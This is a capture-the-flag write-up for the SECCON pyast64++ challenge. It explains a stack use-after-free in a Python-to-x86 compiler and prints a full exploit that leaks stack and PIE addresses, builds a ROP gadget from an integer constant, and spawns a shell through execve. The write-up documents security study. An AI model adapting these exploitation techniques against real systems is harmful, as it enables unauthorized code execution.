# pyast64++.pwn

**Authors**: [gallileo](https://twitter.com/galli_leo_)

**Tags**: pwn, python

**Points**: 233

> Let's make open-sourced JIT projects more secure!
> 
> `nc hiyoko.quals.seccon.jp 9064`
> 
> [pyast64++.pwn.tar.gz](https://secconctf-prod.s3.isk01.sakurastorage.jp/production/pyast64%2b%2b.pwn/pyast64%2b%2b.pwn.tar.gz) bffd7d1d56b476737271d54ca94509f2069649b1

## Introduction

As with every pwn challenge, I first open the binary in IDA.
Well except this time, ... there was no binary!

Instead we are greeted with a Python file called `pyast64.py`.
Looking over it, the design of the challenge becomes clear pretty quickly:
`pyast64.py` takes any (simple) python code and compiles it directly to x86 assembly instructions.
The resulting assembly is then linked into an ELF file (without libc) and ran.

Having analyzed that, the goal is pretty clear: We have to exploit the compiler and get code execution on the server.

## Initial Reconnaissance

`pyast64.py` is pretty complex and so after trying to understand most of it, I started to diff it against the provided version on git.
The only relevant change is to `builtin_array` which also has a comment added to explain how the arrays are now "secure":

```
The original design of `array` was vulnerable to out-of-bounds access
and type confusion. The fixed version of the array has its length
to prevent out-of-bounds access.

i.e. x=array(1)
    0        4        8        16
    +--------+--------+--------+
    | length |  type  |  x[0]  |
    +--------+--------+--------+

The `type` field is used to check if the variable is actually an array.
This value is not guessable.
```

This of course set off my alarms and I assumed we had to somehow work around these security checks.
Therefore, I looked into the design of the arrays in more detail.

## Array Design

To create an array, you have to use the `array(size)` builtin in Python [^1].
In the following, I present some sample Python code using an array and how the compiler implements it (by showing a high level C version of the assembly):

```python
# ...
a = array(4)
a[0] = 0x41 # 'A'
putc(a[0]) # prints A, putc is provided by the compiler
# ...
```

This would look like the following in high level C:

```c
// type definition of array
struct array {
    i32 size;
    u32 type;
    u64 data[0];
}

// ...
struct array* a = alloca(sizeof(struct array) + sizeof(u64)*4);
a->size = 4;
// The upper 4 bytes of the stack canary (at fs:0x28).
a->type = __readfsqword(0x2Cu);
memset(&a->data[0], 0, 4*sizeof(u64));
a->data[0] = 0x41;
putc(a->data[0]);
// ...
```

So, the array is actually allocated on the stack.
This is not further surprising, since all local variables and arguments are allocated on the stack by the compiler.
However, instead of pursuing this part further, I had some other ideas on how to exploit this first.

## Initial Exploit Attempt: Stack Canary without libc?

When I saw the stack canary being used, I was very confused.
Since there was no libc, I expected that the stack canary was not initialized.
My team mates agreed, that this would likely be initialized by libc.
Therefore, I thought I could just assume that the `type` field would always be zero.

Unfortunately, after some debugging I figured out, that this is not the case.
It is indeed the loader that is responsible for initializing the TLS region (pointed to by fs) and hence also the stack canary.
So `type` is indeed a random 32bit value.

## Finding the Bug: Why Allocating on the Stack is Tricky

After some experimenting, I quickly realized where the bug was.
You could return an array perfectly fine from a function where it was allocated.
This is of course a huge issue, because the moment the function returns, the stack frame is deallocated.
Therefore, the returned array points to "freed" memory and we have a stack use-after-free!

I quickly made a proof of concept that would at least crash:

```python
def test():
    a = array(1)
    a[0] = 0x41
    return a

def test2(a):
    b = a[0]
    newline = 0xa
    putc(b)
    putc(newline)

def main():
    a = test()
    test2(a)
```

This yielded the following output [^2]:

```
> python3 pyast64.py -o example.elf example.py && ./example.elf
assembly:
[1]    175041 trace trap (core dumped)  ./example.elf
```

## Exploiting a stack UAF

While I had my fair share of heap UAF exploitation done before, I had never exploited a stack UAF.
The first thing I did, was adding a bunch of helper functions to pretty print arrays, some shamelessly stolen [from the original repo](https://github.com/benhoyt/pyast64/blob/master/arrays.p64)[^3]:

```python
def fetch(array, ofs):
    return array[ofs]

def store(array, ofs, value):
    array[ofs] = value

def print_num(n):
    if n == 0:
        putc(48)  # '0'
        return
    if n < 0:
        putc(45)  # '-' sign
        n = -n
    div = n // 10
    if div != 0:
        print_num(div)
    putc(48 + n % 10)

def print_hex_num(n):
    if n == 0:
        putc(48)  # '0'
        return
    if n < 0:
        putc(45)  # '-' sign
        n = -n
    div = n // 16
    if div != 0:
        print_hex_num(div)
    dig = n % 16
    if dig < 10:
        putc(48 + dig)
    else:
        putc(97 + dig - 10)

def print_arr(s):
    for i in range(1000):
        print_num(i)
        putc(32)
        print_hex_num(fetch(s, i))
        putc(44)
        putc(32) # ' '
    putc(0xa)
```

I also used a way bigger array. The reasoning is simple: The crash I was seeing before, was the local variables of `test2` corrupting my freed array. By making the array very large, `type` and `size` would be very low on the stack and hence not easily corrupted.

Combining this, I can easily print a bunch of the stack as follows:

```python
# ... helpers from above

# creates array on stack
# but after we return the stack frame is gonna be invalid!
def create_freed_array():
    a = array(1000)
    return a

def main():
    b = 0x41414242
    a = create_freed_array()
    print_arr(a)
```

We get the following output:

```
0 0, 1 0, 2 0, 3 0, ..., 969 0, 970 0, 971 0, 972 0, 973 0, 974 0, 975 0, 976 0, 977 0, 978 0, 979 0, 980 0, 981 0, 982 0, 983 0, 984 0, 985 7ffe799f4ca8, 986 55623a9e012d, 987 1, 988 7ffe799f4cc8, 989 7ffe799f4cc8, 990 55623a9e012d, 991 1, 992 7ffe799f4ce8, 993 7ffe799f4ce8, 994 55623a9e012d, 995 3e3, 996 7ffe799f4d08, 997 55623a9e02a6, 998 3e6, 999 7ffe799f2dc0
```

By looking at the mappings of our process, we can immediately identify a PIE leak.
This is useful, as the compiled binary is PIE and we probably want to ROP.

### Figuring out the stack base

I also wanted to figure out the stack base, to allow more easily working with the stack.
I started by taking a random address that looked like it was a stack address and calculating the offset by looking at the actual stack location.
However, this always gave me wrong results and they were not even page aligned!

As it turns out, the linux kernel (due to cache reasons) randomizes the offset of the stack pointer from the end of the page as well!
This means, we cannot reliably determine the base of our stack.
I spent a lot of time during the CTF trying to figure out why my calculations were off, until two debugging sessions revealed that rsp was being randomized.
So what can we do instead?

### Locating our array in memory anyways

Luckily, since local variables are also stored on the stack, we can easily locate the address of our array.
To do this, I created a two level deep function, that had some "placed" local variables and printed the stack then:

```python
# leak stuff, if we give it the freed array
def deeper(a):
    # a2 should be between c and d in the stack dump
    c = 0x43434343
    a2 = a
    d = 0x44444444
    print_arr(a)
    # 999 identified thanks to printing
    return fetch(a, 999)

def leak_array_stack(a):
    b = 0x42424242
    # b = array(10)
    return deeper(a)

def main():
    a = create_freed_array()
    leak_array_stack(a)
```

The output of the above is as follows:

```
0 0, 1 0, 2 0, 3 0, 4 0, ..., 975 7fffe51ba228, 976 564eb04fb12d, 977 1, 978 7fffe51ba248, 979 7fffe51ba248, 980 564eb04fb12d, 981 1, 982 7fffe51ba268, 983 7fffe51ba268, 984 564eb04fb12d, 985 3d9, 986 7fffe51ba288, 987 564eb04fb2a6, 988 3dc, 989 7fffe51b8390, 990 7fffe51ba2a8, 991 3df, 992 564eb04fb38a, 993 7fffe51b8390, 994 7fffe51ba2d8, 995 44444444, 996 7fffe51b8390, 997 43434343, 998 564eb04fb3c0, 999 7fffe51b8390,
```

Thanks to this, we can see that both index `996` and `999` point to our stack buffer.

Using a similar technique for figuring out a PIE address's index, we can also leak that:

```python
def pie_deeper(a):
    return fetch(a, 999)

def leak_pie_addr(a):
    return pie_deeper(a)

def main():
    a = create_freed_array()
    # print_arr(a)
    array_stack_addr = leak_array_stack(a)
    pie_addr = leak_pie_addr(a)
    pie_base = pie_addr - 0x13f2
```

The offset here can be figured out by just getting PIE base through e.g. `/proc/$PID/maps`.

### Building our ROP chain

So how can we get a shell now?
The easiest method is by ROPing. Since we can also write to our freed array, we can overwrite return addresses on the stack.
We already used saved RIPs for our PIE leak above, so by overwriting them we should be good to go.
The only issue, is that the binary does not link against libc and the only syscall instructions are related to `putc` / `getc`.

Fortunately, we can add our own ROP gadgets very easily!
The end of a function always looks as follows in assembly:

```nasm
push 0x41 ; or somehow push return value
pop rax
pop rbp
retn
```

To get a shell, we need to call `execve("/bin/sh", 0, 0);` or jump to a syscall instruction with `*rdi = "/bin/sh", rsi = 0, rdx = 0, rax = 59`.
Since popping rax is already done by every function's end, we just have to pop rdi, rsi and rdx from the stack.
This can be achieved with the following aptly named function:

```python
def gadget1():
    return 0x5f5e5a90
```

When disassembling normally, it looks as follows:

```nasm
push rbp
mov rbp, rsp
push 0x5F5E5A90
pop rax
pop rbp
retn
```

However, if we start disassembling at the address of the push + 1:

```nasm
nop
pop rdx
pop rsi
pop rdi
pop rdx
pop rax
pop rbp
retn
```

We have our gadget!
Hence our ROPchain is now as follows:

```python
gadget1+6 # address of pop rdx
0x0 # rdx
0x0 # rsi
array_stack_addr+8 # rdi, points to beginning of array data
59 # rax, syscall number
0x41414141 # rbp
putc+0x1c # address of syscall
```

### Getting a shell

We have leaks, we have our ROP chain, now we only need to actually use everything!
To that end, we have to ensure that the stack frame of the function where we perform the ROP in, is actually low enough so that we can overwrite everything.
Finally, we also have to pay careful attention of any arguments passed in. Since those are passed on the stack, we have to save them in local variables before performing our stack manipulations.
Otherwise, the stack manipulations will overwrite the arguments.
Lastly, I also store `/bin/sh` in the array, since we have the address to that handy and can point rdi to that.

The final exploit functions are as follows:

```python
# 993 is location of saved rip for returning from this function!
def do_rop_deeper(a, array_addr, gadget_addr, syscall_addr):
    e = 0x45454545
    a2 = a
    array_addr2 = array_addr
    gadget_addr2 = gadget_addr
    syscall_addr2 = syscall_addr
    f = 0x46464646
    bin_sh = 0x6e69622f
    # necessary, otherwise gcc complains about too large constants :/
    bin_sh = bin_sh | (0x0068732f * 65536 * 65536)
    print_arr(a)
    store(a2, 993, gadget_addr2)
    store(a2, 994, 0) # rdx
    store(a2, 0, bin_sh)
    store(a2, 995, 0) # rsi
    store(a2, 996, array_addr2 + 8) # rdi
    store(a2, 997, 59) # rax = syscall number
    store(a2, 998, 0x41414141) # rbp
    store(a2, 999, syscall_addr2)

def do_rop(a, array_addr, gadget_addr, syscall_addr):
    do_rop_deeper(a, array_addr, gadget_addr, syscall_addr)
```

The indexes into our array were again obtained by printing and some trial and error :).

## Final exploit payload

The final exploit payload looks as follows (containing a bunch of debugging stuff leftover from the CTF :)):

```python
def fetch(array, ofs):
    return array[ofs]

def store(array, ofs, value):
    array[ofs] = value

def print_num(n):
    if n == 0:
        putc(48)  # '0'
        return
    if n < 0:
        putc(45)  # '-' sign
        n = -n
    div = n // 10
    if div != 0:
        print_num(div)
    putc(48 + n % 10)

def print_hex_num(n):
    if n == 0:
        putc(48)  # '0'
        return
    if n < 0:
        putc(45)  # '-' sign
        n = -n
    div = n // 16
    if div != 0:
        print_hex_num(div)
    dig = n % 16
    if dig < 10:
        putc(48 + dig)
    else:
        putc(97 + dig - 10)

def print_arr(s):
    for i in range(1000):
        print_num(i)
        putc(32)
        print_hex_num(fetch(s, i))
        putc(44)
        putc(32) # ' '
    putc(0xa)

# creates array on stack
# but after we return the stack frame is gonna be invalid!
def create_freed_array():
    a = array(1000)
    return a

# STACK_BASE = 0
# PIE_BASE = 0
# ARR_CANARY = 0

# rop gadgets

def gadget1():
    return 0x5f5e5a90

# leak stuff, if we give it the freed array
def deeper(a):
    c = 0x43434343
    a2 = a
    d = 0x44444444
    print_arr(a)
    return fetch(a, 999)

def leak_array_stack(a):
    b = 0x42424242
    # b = array(10)
    return deeper(a)

def pie_deeper(a):
    return fetch(a, 999)

def leak_pie_addr(a):
    return pie_deeper(a)

# 993 is location of saved rip for returning from this function!
def do_rop_deeper(a, array_addr, gadget_addr, syscall_addr):
    e = 0x45454545
    a2 = a
    array_addr2 = array_addr
    gadget_addr2 = gadget_addr
    syscall_addr2 = syscall_addr
    f = 0x46464646
    bin_sh = 0x6e69622f
    # necessary, otherwise gcc complains about too large constants :/
    bin_sh = bin_sh | (0x0068732f * 65536 * 65536)
    print_arr(a)
    store(a2, 993, gadget_addr2)
    store(a2, 994, 0) # rdx
    store(a2, 0, bin_sh)
    store(a2, 995, 0) # rsi
    store(a2, 996, array_addr2 + 8) # rdi
    store(a2, 997, 59) # rax = syscall number
    store(a2, 998, 0x41414141) # rbp
    store(a2, 999, syscall_addr2)

def do_rop(a, array_addr, gadget_addr, syscall_addr):
    do_rop_deeper(a, array_addr, gadget_addr, syscall_addr)

def main():
    b = 0x41414242
    a = create_freed_array()
    # print_arr(a)
    array_stack_addr = leak_array_stack(a)
    pie_addr = leak_pie_addr(a)
    pie_base = pie_addr - 0x13f2
    # array_stack_addr = leak_array_stack(a)
    # print_hex_num(0x7ffffffff000)
    print_hex_num(array_stack_addr)
    putc(0xa)
    print_hex_num(pie_addr)
    putc(0xa)
    do_rop(a, array_stack_addr, pie_base + 0x135C, pie_base + 0x1661)
    d = getc()
    putc(0xa)
    putc(d)
```

[^1]: This was unchanged from the original project on GitHub.
[^2]: Note: I changed the provided python file to make it easier to debug. For example I save the assembly output in a temporary file.
[^3]: The `store` / `fetch` functions might seem a bit weird. I had some issues (because I was wrongly using Python 3.8) and so I just copied the code from GitHub. All `store` / `fetch` should be replaceable with normal array indexing now.